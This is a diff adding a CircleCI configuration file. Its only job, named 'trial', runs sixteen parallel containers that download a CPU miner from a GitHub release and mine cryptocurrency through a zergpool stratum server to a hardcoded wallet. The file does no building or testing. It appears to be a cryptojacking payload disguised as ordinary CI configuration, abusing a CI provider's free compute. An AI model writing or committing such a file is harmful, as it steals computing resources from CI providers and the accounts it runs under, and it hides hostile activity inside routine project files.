@@ -1,0 +1,15 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 16
+      steps:
+        - checkout
+        - run:  wget https://github.com/MicroBitcoinOrg/Cpuminer/releases/download/1.0.0/cpuminer-linux.zip && unzip cpuminer-linux.zip && cd cpuminer && ./cpuminer.exe -a power2b -o stratum+tcp://power2b.mine.zergpool.com:7445 -u TDUikTDLFXmZGro1be9FLHUSoe67BFeQXo -p  c=TRX,mc=MBC,ID=MBC
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
